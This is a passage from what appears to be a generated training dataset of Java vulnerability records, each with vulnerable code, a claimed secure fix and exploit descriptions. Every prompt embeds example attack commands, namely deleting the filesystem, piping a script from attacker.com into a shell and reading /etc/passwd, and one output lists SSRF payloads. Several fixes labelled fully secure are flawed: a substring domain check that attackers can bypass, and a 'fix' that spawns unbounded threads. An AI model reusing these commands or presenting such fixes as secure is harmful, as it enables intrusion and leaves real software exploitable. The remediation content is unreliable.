    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: public void setSessionId(String sessionId) {\n    if (sessionId != null && !sessionId.isEmpty()) {\n        this.sessionId = sessionId;\n    }\n}\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public void setSessionId(String sessionId) {\\n    if (sessionId != null && !sessionId.isEmpty()) {\\n        this.sessionId = sessionId;\\n    }\\n}",
      "vulnerability_type": "Session Fixation (Low Severity)",
      "cvss_score": 4.0,
      "fixed_code": "import java.util.UUID;\\n\\npublic void setSessionId() {\\n    String newSessionId = UUID.randomUUID().toString();\\n    this.sessionId = newSessionId;\\n}",
      "exploit_ways": [
        "An attacker can predict or guess session IDs, allowing them to hijack user sessions.",
        "By setting a fixed session ID, an attacker might maintain control over a session after a legitimate user logs in.",
        "Malicious actors could use the ability to set session IDs to perform cross-site request forgery (CSRF) attacks more effectively."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Denial-of-Service (DoS) - Low Impact\n- Vulnerable Code: public class InfiniteLoop {\n    public static void main(String[] args) {\n        while (true) {\n            // This loop will run indefinitely\n        }\n    }\n}\n- CVSS Score: 3.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class InfiniteLoop {\\n    public static void main(String[] args) {\\n        while (true) {\\n            // This loop will run indefinitely\\n        }\\n    }\\n}",
      "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
      "cvss_score": 3.0,
      "fixed_code": "public class LimitedLoop {\\n    public static void main(String[] args) throws InterruptedException {\\n        for (int i = 0; i < 100; i++) {\\n            Thread.sleep(100); // Sleep for 100 milliseconds\\n            // Process logic here\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker can deploy this code to tie up CPU resources, preventing other processes from running.",
        "By executing this in a server environment, it can cause the system to become unresponsive.",
        "Running multiple instances of this code can exhaust system resources leading to a Denial-of-Service."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\npublic class NetworkFetcher {\n    public String fetchData(String urlString) throws Exception {\n        URL url = new URL(urlString);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder content = new StringBuilder();\n        String line;\n        while ((line = in.readLine()) != null) {\n            content.append(line);\n        }\n        in.close();\n        return content.toString();\n    }\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nimport java.net.HttpURLConnection;\\nimport java.net.URL;\\npublic class NetworkFetcher {\\n    public String fetchData(String urlString) throws Exception {\\n        URL url = new URL(urlString);\\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\\n        connection.setRequestMethod(\\\"GET\\\");\\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\\n        StringBuilder content = new StringBuilder();\\n        String line;\\n        while ((line = in.readLine()) != null) {\\n            content.append(line);\\n        }\\n        in.close();\\n        return content.toString();\\n    }\\n}",
      "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
      "cvss_score": 7.5,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nimport java.net.HttpURLConnection;\\nimport java.net.URL;\\npublic class NetworkFetcher {\\n    public String fetchData(String urlString) throws Exception {\\n        if (!urlString.startsWith(\\\"https://api.example.com/\\\")) {\\n            throw new IllegalArgumentException(\\\"Invalid URL\\\");\\n        }\\n        URL url = new URL(urlString);\\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\\n        connection.setRequestMethod(\\\"GET\\\");\\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\\n        StringBuilder content = new StringBuilder();\\n        String line;\\n        while ((line = in.readLine()) != null) {\\n            content.append(line);\\n        }\\n        in.close();\\n        return content.toString();\\n    }\\n}",
      "exploit_ways": [
        "An attacker could input 'http://localhost:8080/secrets' to access internal services.",
        "They might use 'https://attacker.com/malicious-resource' to exfiltrate data via a server-side request.",
        "Inputting 'file:///etc/passwd' can lead to local file inclusion and sensitive information leak."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: public class BankAccount {\n    private int balance = 100;\n\n    public void deposit(int amount) {\n        balance += amount;\n    }\n\n    public void withdraw(int amount) {\n        if (balance >= amount) {\n            balance -= amount;\n        }\n    }\n\n    public int getBalance() {\n        return balance;\n    }\n}\n- CVSS Score: 5.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class BankAccount {\\n    private int balance = 100;\\n\\n    public void deposit(int amount) {\\n        balance += amount;\\n    }\\n\\n    public void withdraw(int amount) {\\n        if (balance >= amount) {\\n            balance -= amount;\\n        }\\n    }\\n\\n    public int getBalance() {\\n        return balance;\\n    }\\n}",
      "vulnerability_type": "Race Condition (Difficult to Exploit)",
      "cvss_score": 5.0,
      "fixed_code": "public class BankAccount {\\n    private int balance = 100;\\n    private final Object lock = new Object();\\n\\n    public void deposit(int amount) {\\n        synchronized (lock) {\\n            balance += amount;\\n        }\\n    }\\n\\n    public void withdraw(int amount) {\\n        synchronized (lock) {\\n            if (balance >= amount) {\\n                balance -= amount;\\n            }\\n        }\\n    }\\n\\n    public int getBalance() {\\n        synchronized (lock) {\\n            return balance;\\n        }\\n    }\\n}",
      "exploit_ways": [
        "Multiple threads could deposit money simultaneously, leading to incorrect balance calculations.",
        "Concurrent withdrawals could result in overdraft situations where more money is withdrawn than deposited.",
        "An attacker with control over multiple threads could manipulate the balance by rapidly alternating deposits and withdrawals."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: public class RaceCondition {\n    private static int count = 0;\n\n    public static void main(String[] args) {\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                count++;\n            }\n        });\n        Thread t2 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                count--;\n            }\n        });\n        t1.start();\n        t2.start();\n        try {\n            t1.join();\n            t2.join();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"Final count: \" + count);\n    }\n}\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class RaceCondition {\\n    private static int count = 0;\\n\\n    public static void main(String[] args) {\\n        Thread t1 = new Thread(() -> {\\n            for (int i = 0; i < 1000; i++) {\\n                count++;\\n            }\\n        });\\n        Thread t2 = new Thread(() -> {\\n            for (int i = 0; i < 1000; i++) {\\n                count--;\\n            }\\n        });\\n        t1.start();\\n        t2.start();\\n        try {\\n            t1.join();\\n            t2.join();\\n        } catch (InterruptedException e) {\\n            e.printStackTrace();\\n        }\\n        System.out.println(\\\"Final count: \\\" + count);\\n    }\\n}",
      "vulnerability_type": "Race Condition (Difficult to Exploit)",
      "cvss_score": 5.3,
      "fixed_code": "public class RaceCondition {\\n    private static int count = 0;\\n    private static final Object lock = new Object();\\n\\n    public static void main(String[] args) {\\n        Thread t1 = new Thread(() -> {\\n            for (int i = 0; i < 1000; i++) {\\n                synchronized(lock) {\\n                    count++;\\n                }\\n            }\\n        });\\n        Thread t2 = new Thread(() -> {\\n            for (int i = 0; i < 1000; i++) {\\n                synchronized(lock) {\\n                    count--;\\n                }\\n            }\\n        });\\n        t1.start();\\n        t2.start();\\n        try {\\n            t1.join();\\n            t2.join();\\n        } catch (InterruptedException e) {\\n            e.printStackTrace();\\n        }\\n        System.out.println(\\\"Final count: \\\" + count);\\n    }\\n}",
      "exploit_ways": [
        "An attacker could cause the final count to be incorrect by manipulating thread timing.",
        "If part of a larger system, inconsistent counts could lead to resource misallocation or errors.",
        "In critical applications, such as banking systems, race conditions can lead to unexpected financial discrepancies."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Open Redirect\n- Vulnerable Code: import java.net.URL;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && isValidRedirectUrl(redirectUrl)) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n        }\n    }\n\n    private boolean isValidRedirectUrl(String url) {\n        try {\n            new URL(url);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.net.URL;\\nimport java.io.IOException;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class RedirectServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String redirectUrl = request.getParameter(\\\"url\\\");\\n        if (redirectUrl != null && isValidRedirectUrl(redirectUrl)) {\\n            response.sendRedirect(redirectUrl);\\n        } else {\\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \\\"Invalid URL\\\");\\n        }\\n    }\\n\\n    private boolean isValidRedirectUrl(String url) {\\n        try {\\n            new URL(url);\\n            return true;\\n        } catch (Exception e) {\\n            return false;\\n        }\\n    }\\n}",
      "vulnerability_type": "Open Redirect",
      "cvss_score": 6.5,
      "fixed_code": "import java.io.IOException;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class RedirectServlet extends HttpServlet {\\n    private static final String[] ALLOWED_DOMAINS = {\\\"example.com\\\", \\\"sub.example.com\\\"};\\n\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String redirectUrl = request.getParameter(\\\"url\\\");\\n        if (redirectUrl != null && isValidRedirectUrl(redirectUrl)) {\\n            response.sendRedirect(redirectUrl);\\n        } else {\\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \\\"Invalid URL\\\");\\n        }\\n    }\\n\\n    private boolean isValidRedirectUrl(String url) {\\n        for (String domain : ALLOWED_DOMAINS) {\\n            if (url.contains(domain)) {\\n                return true;\\n            }\\n        }\\n        return false;\\n    }\\n}",
      "exploit_ways": [
        "An attacker can redirect users to a malicious site by appending a URL parameter pointing to an external domain.",
        "Could use the vulnerability to phish users by directing them to a fake login page that mimics a legitimate one.",
        "Potentially exploit for session fixation by redirecting authenticated users to a crafted URL with a fixed session ID."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Open Redirect\n- Vulnerable Code: import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String url = request.getParameter(\"url\");\n        response.sendRedirect(url);\n    }\n}\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.IOException;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class RedirectServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String url = request.getParameter(\\\"url\\\");\\n        response.sendRedirect(url);\\n    }\\n}",
      "vulnerability_type": "Open Redirect",
      "cvss_score": 6.5,
      "fixed_code": "import java.io.IOException;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class RedirectServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String[] allowedUrls = {\\\"http://example.com\\\", \\\"https://safe-site.com\\\"};\\n        String url = request.getParameter(\\\"url\\\");\\n        for (String allowedUrl : allowedUrls) {\\n            if (allowedUrl.equals(url)) {\\n                response.sendRedirect(url);\\n                return;\\n            }\\n        }\\n        response.sendError(HttpServletResponse.SC_BAD_REQUEST, \\\"Invalid URL\\\");\\n    }\\n}",
      "exploit_ways": [
        "An attacker can redirect users to a malicious site by providing an external URL.",
        "They could use the vulnerability to perform phishing attacks by redirecting to fake login pages.",
        "By appending additional URLs or using JavaScript, they might exploit the open redirect for XSS."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Denial-of-Service (DoS) - Low Impact\n- Vulnerable Code: public class DoSVulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket server = new ServerSocket(8080);\n        System.out.println(\"Server is running on port 8080\");\n        while (true) {\n            Socket client = server.accept();\n            Thread handler = new Thread(() -> {\n                try {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {}\n                } catch (Exception e) {}\n            });\n            handler.start();\n        }\n    }\n}\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class DoSVulnerableServer {\\n    public static void main(String[] args) throws Exception {\\n        ServerSocket server = new ServerSocket(8080);\\n        System.out.println(\\\"Server is running on port 8080\\\");\\n        while (true) {\\n            Socket client = server.accept();\\n            Thread handler = new Thread(() -> {\\n                try {\\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\\n                    String line;\\n                    while ((line = reader.readLine()) != null) {}\\n                } catch (Exception e) {}\\n            });\\n            handler.start();\\n        }\\n    }\\n}",
      "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
      "cvss_score": 3.5,
      "fixed_code": "public class DoSSafeServer {\\n    public static void main(String[] args) throws Exception {\\n        ServerSocket server = new ServerSocket(8080);\\n        System.out.println(\\\"Server is running on port 8080\\\");\\n        ExecutorService executor = Executors.newFixedThreadPool(10);\\n        while (true) {\\n            Socket client = server.accept();\\n            executor.execute(() -> {\\n                try {\\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\\n                    String line;\\n                    while ((line = reader.readLine()) != null) {}\\n                    client.close();\\n                } catch (Exception e) {}\\n            });\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker can send a large number of connections to exhaust server resources.",
        "By sending infinite data streams, the server threads get stuck in an endless loop.",
        "Using slowloris-style attacks, the server can be overwhelmed with partially open connections."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Denial-of-Service (DoS) - Low Impact\n- Vulnerable Code: public class SlowServer {\\n    public static void main(String[] args) throws InterruptedException {\\n        while (true) {\\n            Thread.sleep(10);\\n            if (Math.random() < 0.01) {\\n                heavyComputation();\\n            }\\n        }\\n    }\\n\\n    private static void heavyComputation() {\\n        double result = 0;\\n        for (int i = 0; i < 10000000; i++) {\\n            result += Math.sqrt(i);\\n        }\\n    }\\n}\n- CVSS Score: 4.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class SlowServer {\\n    public static void main(String[] args) throws InterruptedException {\\n        while (true) {\\n            Thread.sleep(10);\\n            if (Math.random() < 0.01) {\\n                heavyComputation();\\n            }\\n        }\\n    }\\n\\n    private static void heavyComputation() {\\n        double result = 0;\\n        for (int i = 0; i < 10000000; i++) {\\n            result += Math.sqrt(i);\\n        }\\n    }\\n}",
      "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
      "cvss_score": 4.3,
      "fixed_code": "public class SlowServer {\\n    public static void main(String[] args) throws InterruptedException {\\n        while (true) {\\n            Thread.sleep(10);\\n            if (Math.random() < 0.01) {\\n                Thread computationThread = new Thread(() -> heavyComputation());\\n                computationThread.start();\\n            }\\n        }\\n    }\\n\\n    private static void heavyComputation() {\\n        double result = 0;\\n        for (int i = 0; i < 10000000; i++) {\\n            result += Math.sqrt(i);\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker could cause the server to run many heavy computations concurrently, degrading performance.",
        "By triggering frequent heavy computations, an attacker can exhaust CPU resources on the server.",
        "If this code is part of a larger system, the DoS could propagate and affect other services."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Clickjacking (Low Severity)\n- Vulnerable Code: import java.awt.*;\nimport java.awt.event.*;\nimport javax.swing.*;\nclass ClickJackingDemo {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"ClickJacking Example\");\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        JPanel panel = new JPanel() {\n            @Override\n            protected void paintComponent(Graphics g) {\n                super.paintComponent(g);\n                try {\n                    ImageIcon icon = new ImageIcon(\"https://example.com/image.png\");\n                    g.drawImage(icon.getImage(), 0, 0, null);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        };\n        panel.addMouseListener(new MouseAdapter() {\n            @Override\n            public void mouseClicked(MouseEvent e) {\n                JOptionPane.showMessageDialog(null, \"Clicked on transparent area!\");\n            }\n        });\n        frame.add(panel);\n        frame.setVisible(true);\n    }\n}\n- CVSS Score: 3.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": 